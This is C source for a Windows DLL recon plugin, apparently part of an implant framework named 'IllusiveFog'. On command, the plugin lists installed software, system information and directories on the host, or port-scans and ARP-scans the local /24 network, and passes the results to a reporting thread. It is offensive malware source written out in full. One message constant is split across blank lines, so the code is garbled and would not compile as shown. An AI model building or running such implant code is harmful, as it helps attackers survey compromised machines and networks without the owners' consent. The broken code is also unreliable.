#include "VerboseRecon.h"
__declspec(dllexport)void re(HANDLE localevent) {

	MSG msg;
	char* host = NULL;
	while (!PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)) {
		SetEvent(localevent);
		GetMessage(&msg, NULL, NULL, NULL);
		if (msg.message == WM_
			
			
			_PLUGIN_LAUNCH) {
			Sleep(0x800);

			Pplugin_param plugin_param = (Pplugin_param)msg.lParam;
			enum vr2_methods vr = select_method(plugin_param->param);
			if (vr == systeminfo) {
				vr2_report_enum_software(plugin_param->reporter_threadid, plugin_param->reporter_event);
				vr2_report_computerinfo(plugin_param->reporter_threadid, plugin_param->reporter_event);
				vr2_report_directories(plugin_param->reporter_threadid, plugin_param->reporter_event);
			}
			else if (vr == network_info) {
				char* host = (char*)allocheap(250);
				ZeroMemory(host, 250);
				ULONG status = 0;
				get_current_host(host, &status);
				if ((status & 0xffffffff) != -1) {
					port_scan(host, plugin_param->reporter_threadid, plugin_param->reporter_event);
					arp_scan(host, 24, plugin_param->reporter_event, plugin_param->reporter_threadid);
				}
				freeheap(host);
			}
			report(plugin_param->reporter_event, plugin_param->reporter_threadid, NULL);
			SetEvent(localevent);
			ResetEvent(localevent);
			continue;
		}
		else if (msg.message == WM_IllusiveFog_PLUGIN_TERMINATE) {
			ExitThread(0);
		}
	}
}
BOOL  DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

